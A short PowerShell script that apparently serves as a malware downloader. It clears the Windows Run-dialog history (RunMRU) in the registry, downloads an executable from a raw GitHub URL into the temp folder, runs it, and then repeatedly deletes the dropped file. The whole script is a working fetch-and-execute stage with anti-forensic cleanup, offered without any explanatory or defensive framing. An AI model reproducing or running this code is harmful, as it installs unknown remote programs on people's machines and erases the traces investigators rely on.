Remove-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Force -ErrorAction SilentlyContinue
(new-object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/samanaya/1/main/1.exe", "$env:TEMP\\1.exe")
Start-Process "$env:TEMP\\1.exe"
Start-Sleep -Milliseconds 1000
while (Test-Path "$env:TEMP\\1.exe") { Start-Sleep -Milliseconds 100; Remove-Item "$env:TEMP\\1.exe" -Force -ErrorAction SilentlyContinue }
